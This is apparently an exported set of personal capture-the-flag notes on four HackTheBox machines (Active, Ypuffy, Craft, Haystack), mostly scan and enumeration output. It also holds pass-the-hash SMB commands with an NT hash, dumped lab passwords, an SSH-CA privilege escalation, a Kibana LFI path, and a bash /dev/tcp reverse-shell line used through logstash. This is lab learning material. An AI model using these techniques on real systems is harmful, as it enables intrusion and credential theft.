<br />|   2.02: <br />|_    Message signing enabled and required<br />| smb2-time: <br />|   date: 2020-04-03T21:18:51<br />|_  start_date: 2020-04-03T19:18:19<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 221.42 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-03 17:21 EDT<br />Nmap scan report for 10.10.10.100<br />Host is up (0.13s latency).<br />Not shown: 65512 closed ports<br />PORT      STATE SERVICE<br />53/tcp    open  domain<br />88/tcp    open  kerberos-sec<br />135/tcp   open  msrpc<br />139/tcp   open  netbios-ssn<br />389/tcp   open  ldap<br />445/tcp   open  microsoft-ds<br />464/tcp   open  kpasswd5<br />593/tcp   open  http-rpc-epmap<br />636/tcp   open  ldapssl<br />3268/tcp  open  globalcatLDAP<br />3269/tcp  open  globalcatLDAPssl<br />5722/tcp  open  msdfsr<br />9389/tcp  open  adws<br />47001/tcp open  winrm<br />49152/tcp open  unknown<br />49153/tcp open  unknown<br />49154/tcp open  unknown<br />49155/tcp open  unknown<br />49157/tcp open  unknown<br />49158/tcp open  unknown<br />49169/tcp open  unknown<br />49171/tcp open  unknown<br />49180/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 3469.53 seconds<br /></div><div class='page'><h1 class='title level-6'>enum4linux</h1><br/>enum4linux -a 10.10.10.100 | tee e4lresults.txt<br />Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Fri Apr  3 17:28:24 2020<br /><br /> ========================== <br />|    Target Information    |<br /> ========================== <br />Target ........... 10.10.10.100<br />RID Range ........ 500-550,1000-1050<br />Username ......... &#39;&#39;<br />Password ......... &#39;&#39;<br />Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br /><br /><br /> ==================================================== <br />|    Enumerating Workgroup/Domain on 10.10.10.100    |<br /> ==================================================== <br />[E] Can&#39;t find workgroup/domain<br /><br /><br /> ============================================ <br />|    Nbtstat Information for 10.10.10.100    |<br /> ============================================ <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.<br />Looking up status of 10.10.10.100<br />No reply from 10.10.10.100<br /><br /> ===================================== <br />|    Session Check on 10.10.10.100    |<br /> ===================================== <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.<br />[+] Server 10.10.10.100 allows sessions using username &#39;&#39;, password &#39;&#39;<br />[+] Got domain/workgroup name: <br /><br /> =========================================== <br />|    Getting domain SID for 10.10.10.100    |<br /> =========================================== <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.<br />could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED<br />could not obtain sid from server<br />error: NT_STATUS_ACCESS_DENIED<br />[+] Can&#39;t determine if host is part of domain or part of a workgroup<br /><br /> ====================================== <br />|    OS information on 10.10.10.100    |<br /> ====================================== <br />Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.<br />[+] Got OS info for 10.10.10.100 from smbclient: <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.<br />[E] Can&#39;t get OS info with srvinfo: NT_STATUS_ACCESS_DENIED<br /><br /> ============================= <br />|    Users on 10.10.10.100    |<br /> ============================= <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.<br />[E] Couldn&#39;t find users using querydispinfo: NT_STATUS_ACCESS_DENIED<br /><br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.<br />[E] Couldn&#39;t find users using enumdomusers: NT_STATUS_ACCESS_DENIED<br /><br /> ========================================= <br />|    Share Enumeration on 10.10.10.100    |<br /> ========================================= <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.<br /><br />	Sharename       Type      Comment<br />	---------       ----      -------<br />	ADMIN$          Disk      Remote Admin<br />	C$              Disk      Default share<br />	IPC$            IPC       Remote IPC<br />	NETLOGON        Disk      Logon server share <br />	Replication     Disk      <br />	SYSVOL          Disk      Logon server share <br />	Users           Disk      <br />SMB1 disabled -- no workgroup available<br /><br />[+] Attempting to map shares on 10.10.10.100<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.<br />//10.10.10.100/ADMIN$	Mapping: DENIED, Listing: N/A<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.<br />//10.10.10.100/C$	Mapping: DENIED, Listing: N/A<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.<br />//10.10.10.100/IPC$	Mapping: OK	Listing: DENIED<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.<br />//10.10.10.100/NETLOGON	Mapping: DENIED, Listing: N/A<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.<br />//10.10.10.100/Replication	Mapping: OK, Listing: OK<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.<br />//10.10.10.100/SYSVOL	Mapping: DENIED, Listing: N/A<br />//10.10.10.100/Users	Mapping: DENIED, Listing: N/A<br /><br /> ==================================================== <br />|    Password Policy Information for 10.10.10.100    |<br /> ==================================================== <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.<br />[E] Unexpected error from polenum:<br /><br /><br />[+] Attaching to 10.10.10.100 using a NULL share<br /><br />[+] Trying protocol 139/SMB...<br /><br />	[!] Protocol failed: Cannot request session (Called Name:10.10.10.100)<br /><br />[+] Trying protocol 445/SMB...<br /><br />	[!] Protocol failed: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)<br /><br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.<br /><br />[E] Failed to get password policy with rpcclient<br /><br /><br /> ============================== <br />|    Groups on 10.10.10.100    |<br /> ============================== <br /><br />[+] Getting builtin groups:<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.<br />[E] Can&#39;t get builtin groups: NT_STATUS_ACCESS_DENIED<br /><br />[+] Getting builtin group memberships:<br /><br />[+] Getting local groups:<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.<br />[E] Can&#39;t get local groups: NT_STATUS_ACCESS_DENIED<br /><br />[+] Getting local group memberships:<br /><br />[+] Getting domain groups:<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.<br />[E] Can&#39;t get domain groups: NT_STATUS_ACCESS_DENIED<br /><br />[+] Getting domain group memberships:<br /><br /> ======================================================================= <br />|    Users on 10.10.10.100 via RID cycling (RIDS: 500-550,1000-1050)    |<br /> ======================================================================= <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.<br />[E] Couldn&#39;t get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.<br /><br /> ============================================= <br />|    Getting printer info for 10.10.10.100    |<br /> ============================================= <br />could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED<br />could not obtain sid from server<br />error: NT_STATUS_ACCESS_DENIED<br /><br /><br />enum4linux complete on Fri Apr  3 17:29:07 2020<br /><br /></div><div class='page'><h1 class='title level-6'>smb vuln nmap</h1><br/>nmap --script smb-vuln* -p 139,445 10.10.10.100<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-03 17:28 EDT<br />Nmap scan report for Active.htb (10.10.10.100)<br />Host is up (0.13s latency).<br /><br />PORT    STATE SERVICE<br />139/tcp open  netbios-ssn<br />445/tcp open  microsoft-ds<br /><br />Host script results:<br />|_smb-vuln-ms10-054: false<br />|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR<br /><br />Nmap done: 1 IP address (1 host up) scanned in 13.27 seconds<br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br />86d67d8ba232bb6a254aa4d10159e983<br />root<br />b5fc76d1d6b91d77b2fbf2d54d0f708b</div><div class='page'><h1 class='title level-4'>10.10.10.107 Ypuffy</h1><br/>nmap showed that ssh, http, smb, and ldap were open.<br />ssh version showed that it was probably a OpenBSD 6.3 machine<br />http could not be navigated to.<br />smb, I could not read dirs anonymously, but I could connect.<br />nmap -p 389 --script ldap-search -Pn 10.10.10.107   showed an allowed anonymouns bind could be made.<br />    also, the base namingcontexts was “DC=hackthebox,DC=htb”<br /><br />ldapsearch -h 10.10.10.107 -x -b &#39;DC=hackthebox,DC=htb&#39;     dumped the whole ldap db for me.<br />in the db I found a sambaNTPassword hash for alice1978<br />    0B186E661BBDBDCF6047784DE8B9FD8B<br />    <br />a credentialed smb map showed that I could read and write to the alice directory<br />    smbmap -H 10.10.10.107 -u alice1978 -p 0B186E661BBDBDCF6047784DE8B9FD8B:0B186E661BBDBDCF6047784DE8B9FD8B<br />    <br />a credentialed smbclient command enabled me to connect and pull off the single file in the share “my_private_key.ppk”<br />    smbclient -h &#39;\\10.10.10.107\alice&#39; -U alice1978 -W ypuffy.hackthebox.htb -l 10.10.10.107 --pw-nt-hash 0B186E661BBDBDCF6047784DE8B9FD8B:0B186E661BBDBDCF6047784DE8B9FD8B<br />    <br />.ppk files are putty private keys. I used puttygen (from putty-tools) to convert the key to openssh format so I can use it to ssh in!<br />    puttygen my_private_key.ppk -O private-openssh -o alice1978.pem<br />ssh successful and user flag!!!<br /><br />There is no sudo -l in OpenBSD so instead I cat&#39;ed the /etc/doas.conf and saw that I could run ssh-keygen as “userca”<br />I cheated like crazy to find the syntax, but the idea was that I could create ssh key-pair for root and then sign the public key with userca and then ssh into root that way.<br /><br />mkdir /tmp/yeet<br />cmod 777 yeet<br />cd /yeet<br />ssh-keygen<br />    point the key to /tmp/yeet/id_rsa<br />ls<br />    you will see that id_rsa and id_rsa.pub have been created<br />doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -n 3m3rgencyB4ckd00r -I root /tmp/yeet/id_rsa.pub<br />                                                        ^location of ca file    ^principal               ^username to principal^location<br />ls<br />    you will see that id_rse-cert.pub has also been created. this is a certificate signed by “userca” to authenticate id_rsa.pub<br />ssh -i id_rsa.pub root@localhost<br />    this will work because the public key is verified it will see that it is signed by the ca, meaning that it is authenticated and will allow login.</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>Bob<br />bob8791<br />Alice<br />e0JTREFVVEh9YWxpY2UxOTc4<br />alice1978<br /><br /><br /><br /><br /><br /><br /><br />quid@CoolHandKali:/Yeet/Machines/HTB/Ypuffy$ smbmap -H 10.10.10.107 -u alice1978 -p 0B186E661BBDBDCF6047784DE8B9FD8B:0B186E661BBDBDCF6047784DE8B9FD8B <br />[+] Finding open SMB ports....<br />[+] Hash detected, using pass-the-hash to authenticate<br />[+] User session established on 10.10.10.107...<br />[+] IP: 10.10.10.107:445	Name: ypuffy.hackthebox.htb                             <br />	Disk                                                  	Permissions	Comment<br />	----                                                  	-----------	-------<br />	alice                                             	READ, WRITE	Alice&#39;s Windows Directory<br />	IPC$                                              	NO ACCESS	IPC Service (Samba Server)<br />squid@CoolHandKali:/Yeet/Machines/HTB/Ypuffy$ smbclient -h &#39;\\10.10.10.107\alice&#39; -U alice1978 -W ypuffy.hackthebox.local --pw-nt-hash 0B186E661BBDBDCF6047784DE8B9FD8B:0B186E661BBDBDCF6047784DE8B9FD8B -l 10.10.10.107<br />Try &quot;help&quot; to get a list of possible commands.<br />smb: \&gt; dir<br />  .                                   D        0  Sat Apr  4 09:59:45 2020<br />  ..                                  D        0  Tue Jul 31 23:16:50 2018<br />  my_private_key.ppk                  A     1460  Mon Jul 16 21:38:51 2018<br /><br />		433262 blocks of size 1024. 411540 blocks available<br />smb: \&gt; get my_private_key.ppk<br /></div><div class='page'><h1 class='title level-6'>SmartNmap</h1><br/>nmap 10.10.10.107 &amp;&amp; nmap -sC -sV 10.10.10.107 &amp;&amp; nmap -p- 10.10.10.107<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-04 08:06 EDT<br />Nmap scan report for 10.10.10.107<br />Host is up (0.14s latency).<br />Not shown: 995 closed ports<br />PORT    STATE SERVICE<br />22/tcp  open  ssh<br />80/tcp  open  http<br />139/tcp open  netbios-ssn<br />389/tcp open  ldap<br />445/tcp open  microsoft-ds<br /><br />Nmap done: 1 IP address (1 host up) scanned in 18.75 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-04 08:07 EDT<br />Nmap scan report for 10.10.10.107<br />Host is up (0.14s latency).<br />Not shown: 995 closed ports<br />PORT    STATE SERVICE     VERSION<br />22/tcp  open  ssh         OpenSSH 7.7 (protocol 2.0)<br />| ssh-hostkey: <br />|   2048 2e:19:e6:af:1b:a7:b0:e8:07:2a:2b:11:5d:7b:c6:04 (RSA)<br />|   256 dd:0f:6a:2a:53:ee:19:50:d9:e5:e7:81:04:8d:91:b6 (ECDSA)<br />|_  256 21:9e:db:bd:e1:78:4d:72:b0:ea:b4:97:fb:7f:af:91 (ED25519)<br />80/tcp  open  http        OpenBSD httpd<br />139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YPUFFY)<br />389/tcp open  ldap        (Anonymous bind OK)<br />445/tcp open  netbios-ssn Samba smbd 4.7.6 (workgroup: YPUFFY)<br />Service Info: Host: YPUFFY<br /><br />Host script results:<br />|_clock-skew: mean: 1h19m55s, deviation: 2h18m34s, median: -4s<br />| smb-os-discovery: <br />|   OS: Windows 6.1 (Samba 4.7.6)<br />|   Computer name: ypuffy<br />|   NetBIOS computer name: YPUFFY\x00<br />|   Domain name: hackthebox.htb<br />|   FQDN: ypuffy.hackthebox.htb<br />|_  System time: 2020-04-04T08:07:47-04:00<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2020-04-04T12:07:47<br />|_  start_date: N/A<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 55.79 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-04 08:08 EDT<br />Warning: 10.10.10.107 giving up on port because retransmission cap hit (10).<br /><br /></div><div class='page'><h1 class='title level-6'>web</h1><br/>nikto, dirb, and actually connecting was unsuccessful</div><div class='page'><h1 class='title level-7'>web nmap</h1><br/>Scanned at 2020-04-04 08:07:56 EDT for 23s<br /><br />PORT   STATE SERVICE REASON  VERSION<br />80/tcp open  http    syn-ack OpenBSD httpd<br /><br />NSE: Script Post-scanning.<br />NSE: Starting runlevel 1 (of 2) scan.<br /></div><div class='page'><h1 class='title level-6'>ldap</h1><br/>anonymous authentication successful, no data accessable</div><div class='page'><h1 class='title level-7'>data</h1><br/>squid@CoolHandKali:/Yeet/Machines/HTB/Ypuffy$ ldapsearch -h 10.10.10.107 -x -b &quot;DC=hackthebox,DC=htb&quot; <br /># extended LDIF<br />#<br /># LDAPv3<br /># base &lt;DC=hackthebox,DC=htb&gt; with scope subtree<br /># filter: (objectclass=*)<br /># requesting: ALL<br />#<br /><br /># hackthebox.htb<br />dn: dc=hackthebox,dc=htb<br />dc: hackthebox<br />objectClass: top<br />objectClass: domain<br /><br /># passwd, hackthebox.htb<br />dn: ou=passwd,dc=hackthebox,dc=htb<br />ou: passwd<br />objectClass: top<br />objectClass: organizationalUnit<br /><br /># bob8791, passwd, hackthebox.htb<br />dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb<br />uid: bob8791<br />cn: Bob<br />objectClass: account<br />objectClass: posixAccount<br />objectClass: top<br />userPassword:: e0JTREFVVEh9Ym9iODc5MQ==<br />uidNumber: 5001<br />gidNumber: 5001<br />gecos: Bob<br />homeDirectory: /home/bob8791<br />loginShell: /bin/ksh<br /><br /># alice1978, passwd, hackthebox.htb<br />dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb<br />uid: alice1978<br />cn: Alice<br />objectClass: account<br />objectClass: posixAccount<br />objectClass: top<br />objectClass: sambaSamAccount<br />userPassword:: e0JTREFVVEh9YWxpY2UxOTc4<br />uidNumber: 5000<br />gidNumber: 5000<br />gecos: Alice<br />homeDirectory: /home/alice1978<br />loginShell: /bin/ksh<br />sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001<br />displayName: Alice<br />sambaAcctFlags: [U          ]<br />sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000<br />sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B<br />sambaPwdLastSet: 1532916644<br /><br /># group, hackthebox.htb<br />dn: ou=group,dc=hackthebox,dc=htb<br />ou: group<br />objectClass: top<br />objectClass: organizationalUnit<br /><br /># bob8791, group, hackthebox.htb<br />dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb<br />objectClass: posixGroup<br />objectClass: top<br />cn: bob8791<br />userPassword:: e2NyeXB0fSo=<br />gidNumber: 5001<br /><br /># alice1978, group, hackthebox.htb<br />dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb<br />objectClass: posixGroup<br />objectClass: top<br />cn: alice1978<br />userPassword:: e2NyeXB0fSo=<br />gidNumber: 5000<br /><br /># ypuffy, hackthebox.htb<br />dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb<br />sambaDomainName: YPUFFY<br />sambaSID: S-1-5-21-3933741069-3307154301-3557023464<br />sambaAlgorithmicRidBase: 1000<br />objectclass: sambaDomain<br />sambaNextUserRid: 1000<br />sambaMinPwdLength: 5<br />sambaPwdHistoryLength: 0<br />sambaLogonToChgPwd: 0<br />sambaMaxPwdAge: -1<br />sambaMinPwdAge: 0<br />sambaLockoutDuration: 30<br />sambaLockoutObservationWindow: 30<br />sambaLockoutThreshold: 0<br />sambaForceLogoff: -1<br />sambaRefuseMachinePwdChange: 0<br />sambaNextRid: 1001<br /><br /># search result<br />search: 2<br />result: 0 Success<br /><br /># numResponses: 9<br /># numEntries: 8<br />squid@CoolHandKali:/Yeet/Machines/HTB/Ypuffy$ <br /></div><div class='page'><h1 class='title level-6'>smb</h1><br/></div><div class='page'><h1 class='title level-7'>enum4linux</h1><br/>enum4linux -a 10.10.10.107 | tee e4lresults.txt<br />Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Sat Apr  4 08:25:01 2020<br /><br /> ========================== <br />|    Target Information    |<br /> ========================== <br />Target ........... 10.10.10.107<br />RID Range ........ 500-550,1000-1050<br />Username ......... &#39;&#39;<br />Password ......... &#39;&#39;<br />Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br /><br /><br /> ==================================================== <br />|    Enumerating Workgroup/Domain on 10.10.10.107    |<br /> ==================================================== <br />[E] Can&#39;t find workgroup/domain<br /><br /><br /> ============================================ <br />|    Nbtstat Information for 10.10.10.107    |<br /> ============================================ <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.<br />Looking up status of 10.10.10.107<br />No reply from 10.10.10.107<br /><br /> ===================================== <br />|    Session Check on 10.10.10.107    |<br /> ===================================== <br />[E] Server doesn&#39;t allow session using username &#39;&#39;, password &#39;&#39;.  Aborting remainder of tests.<br />squid@CoolHandKali:/Yeet/Machines/HTB/Ypuffy$ enum4linux -a ypuffy<br />Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Sat Apr  4 08:25:49 2020<br /><br /> ========================== <br />|    Target Information    |<br /> ========================== <br />Target ........... ypuffy<br />RID Range ........ 500-550,1000-1050<br />Username ......... &#39;&#39;<br />Password ......... &#39;&#39;<br />Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br /><br /><br /> ============================================== <br />|    Enumerating Workgroup/Domain on ypuffy    |<br /> ============================================== <br />[E] Can&#39;t find workgroup/domain<br /><br /><br /> ====================================== <br />|    Nbtstat Information for ypuffy    |<br /> ====================================== <br />Looking up status of 10.10.10.107<br />No reply from 10.10.10.107<br /><br /> =============================== <br />|    Session Check on ypuffy    |<br /> =============================== <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.<br />[E] Server doesn&#39;t allow session using username &#39;&#39;, password &#39;&#39;.  Aborting remainder of tests.</div><div class='page'><h1 class='title level-7'>smb nmap</h1><br/>nmap --script smb-vuln* -p 139,445 10.10.10.107<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-04 08:24 EDT<br />Nmap scan report for ypuffy (10.10.10.107)<br />Host is up (0.14s latency).<br /><br />PORT    STATE SERVICE<br />139/tcp open  netbios-ssn<br />445/tcp open  microsoft-ds<br /><br />Host script results:<br />|_smb-vuln-ms10-054: false<br />|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED<br /><br />Nmap done: 1 IP address (1 host up) scanned in 143.51 seconds<br />squid@CoolHandKali:/Yeet/Machines/HTB/Ypuffy$ <br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br />acbc06eb2982b14c2756b6c6e3767aab<br />root<br />1265f8e0a1984edd9dc1b6c3fcd1757f</div><div class='page'><h1 class='title level-4'>10.10.10.110 Craft</h1><br/>quick nmap showed that 443 and 22 were open<br />There were two links on the main page that would not go anywhere<br /><a href="https://api.craft.htb/api/">https://api.craft.htb/api/</a><br /><a href="https://gogs.craft.htb/">https://gogs.craft.htb/</a><br />add api.craft.htb and gogs.craft.htb to /etc/hosts and Boom routable!<br />dirsearch showed <a href="https://gogs.craft.htb/Craft">https://gogs.craft.htb/Craft</a><br />in the comments of “issues” we saw a curl request to the database, it failed so the token must be expired<br />    <code>curl -H &#39;X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw&#39; -H &quot;Content-Type: application/json&quot; -k -X POST https://api.craft.htb/api/brew/ --data &#39;{&quot;name&quot;:&quot;bullshit&quot;,&quot;brewer&quot;:&quot;bullshit&quot;, &quot;style&quot;: &quot;bullshit&quot;, &quot;abv&quot;: &quot;15.0&quot;)}&#39;</code><br /><br />Now we need to find creds to make a new token<br />(Looking back I don&#39;t know where I found them, but they were in the open somewhere)<br />Bryan found a sweet script to generate a new webtoken and then get a reverse shell<br /><a href="https://github.com/Kucharskov/HTB-Scripts">https://github.com/Kucharskov/HTB-Scripts</a><br /><br />root!!! ... but not really, we are some super limited doker entity<br /><br />but there is a script used to query mysql_database<br />sql = “SELECT * FROM `user`”      and change &quot;fetchone&quot; to &quot;fetchall&quot;<br />boom! we have web logins for all the guys!!<br /> <br />gilfoyle has a hidden repository!<br />we see he has his ssh public and private key here, we steal the private key,<br />ssh -i /root/id_rsa gilfoyle@10.10.10.110<br />we are in!<br /><br />now also in this private repository we saw the vault was running, used to make one time passwords for root logins<br />after much fuckery with the syntax<br />vault ssh -role root_otp -mode otp root@10.10.10.110<br />boom! we are given the OTP<br />throw it in there...<br /><h1>ROOTED</h1></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/><a href="https://github.com/Kucharskov/HTB-Scripts">https://github.com/Kucharskov/HTB-Scripts</a><br /><br /><br />[{&#39;id&#39;: 1, &#39;username&#39;: &#39;dinesh&#39;, &#39;password&#39;: &#39;4aUh0A8PbVJxgd&#39;}, {&#39;id&#39;: 4, &#39;username&#39;: &#39;ebachman&#39;, &#39;password&#39;: &#39;llJ77D8QFkLPQB&#39;}, {&#39;id&#39;: 5, &#39;username&#39;: &#39;gilfoyle&#39;, &#39;password&#39;: &#39;ZEU3N8WNM2rh4T&#39;}]<br /></div><div class='page'><h1 class='title level-6'>nmap</h1><br/></div><div class='page'><h1 class='title level-7'>quick</h1><br/>nmap 10.10.10.110<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-01 17:32 EDT<br />Nmap scan report for 10.10.10.110<br />Host is up (0.11s latency).<br />Not shown: 998 closed ports<br />PORT    STATE SERVICE<br />22/tcp  open  ssh<br />443/tcp open  https<br /><br />Nmap done: 1 IP address (1 host up) scanned in 3.66 seconds<br /></div><div class='page'><h1 class='title level-6'>python mysql</h1><br/>/opt/app # cat fme.py <br />#!/usr/bin/env python<br /><br />import pymysql<br />from craft_api import settings<br /><br /># test connection to mysql database<br /><br />connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,<br />                             user=settings.MYSQL_DATABASE_USER,<br />                             password=settings.MYSQL_DATABASE_PASSWORD,<br />                             db=settings.MYSQL_DATABASE_DB,<br />                             cursorclass=pymysql.cursors.DictCursor)<br /><br />try: <br />    with connection.cursor() as cursor:<br />#        sql = &quot;SELECT `id`, `username`, `password` FROM `user` LIMIT 100&quot;<br />        sql = &quot;SELECT * FROM `user` LIMIT 1000000&quot;<br />        cursor.execute(sql)<br />        result = cursor.fetchall()<br />        print(result)<br />#        print(user)<br />#        print(password)<br /><br />finally:<br />    connection.close()/opt/app # <br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br />    bbf4b0cadfa3d4e6d0914c9cd5a612d4<br />root<br />    831d64ef54d92c1af795daae28a11591</div><div class='page'><h1 class='title level-4'>10.10.10.115 Haystack</h1><br/>nmap showed that 22, 80, and 9200 were all open<br />bryan already had user so I cheated and took his advice downloading the main picture and cat-ing it<br />This showed a base 64 encoded string saying         la aguja en el pajar es &quot;clave&quot;<br />this was useful when going to the 9200 web server.<br /><a href="http://10.10.10.115:9200/quotes/_search?size=5000">http://10.10.10.115:9200/quotes/_search?size=5000</a><br />This synax is usefull when querying elastic.<br />we control f&#39;d through this looking for “clave”<br />pass: spanish.is.key<br />user: security                          &lt;&lt; after base64 decoding we found these<br />tried these creds with ssh... Success!!!<br />after poking around we found no obvious stuff so we went to the web looking for elk privesc stuff<br />we found on github an lfi to get us to kibana!!<br /><br />in order to do this we first needed to tunnel through our ssh connection and then to the target box itself<br />ssh -L 5601:127.0.0.1:5601 securtiy@10.10.10.115<br /><br />127.0.0.1:5601<code>/api/console/api_server?sense_version=@@SENSE_VERSION&amp;apis=../../../../../../.../../../../path/to/shell.js</code><br /><a href="https://github.com/mpgn/CVE-2018-17246">https://github.com/mpgn/CVE-2018-17246</a> &lt;&lt;&lt;&lt;&lt;<br />after making a javascript reverse shell payload and starting a listener, we are now kibana!!!<br /><br />now the witchcraft starts...<br />after looking up millions of articles and endless google searching we thought that we must cheat.<br />we were right.<br />turns out logstash (the L in ELK) runs off of three files input.conf, filter.conf, output.conf.  &lt;just fun trivial knowledge<br />if we touch /opt/kibana/logstash_1<br />then inside of it put                        Ejecutar comando :  bash -i &gt;&amp; /dev/tcp/10.10.14.37/6666 0&gt;&amp;1                       &lt;&lt;the mexican stuff will change depending on output.conf<br />start a nc listener...<br />and within a minute we get a root shell!!<br />we had to cheat pretty good but learned a neat lesson at the end, any time you see code execution you have got a chance.</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>pass: spanish.is.key</div><div class='page'><h1 class='title level-6'>nmap</h1><br/>root@kali:~/Desktop/Machines/HTB/Haystack# nmap -sC -sV -p- 10.10.10.115<br />Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-24 12:46 EDT<br />Nmap scan report for 10.10.10.115<br />Host is up (0.10s latency).<br />Not shown: 65532 filtered ports<br />PORT     STATE SERVICE VERSION<br />22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)<br />| ssh-hostkey: <br />|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)<br />|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)<br />|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)<br />80/tcp   open  http    nginx 1.12.2<br />|_http-server-header: nginx/1.12.2<br />|_http-title: Site doesn&#39;t have a title (text/html).<br />9200/tcp open  http    nginx 1.12.2<br />| http-methods: <br />|_  Potentially risky methods: DELETE<br />|_http-server-header: nginx/1.12.2<br />|_http-title: Site doesn&#39;t have a title (application/json; charset=UTF-8).<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 433.20 seconds<br /></div><div class='page'><h1 class='title level-6'>dirsearch</h1><br/></div><div class='page'><h1 class='title level-6'>nikto</h1><br/>- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.10.10.115<br />+ Target Hostname:    10.10.10.115<br />+ Target Port:        9200<br />+ Start Time:         2019-10-24 13:06:30 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: nginx/1.12.2<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No 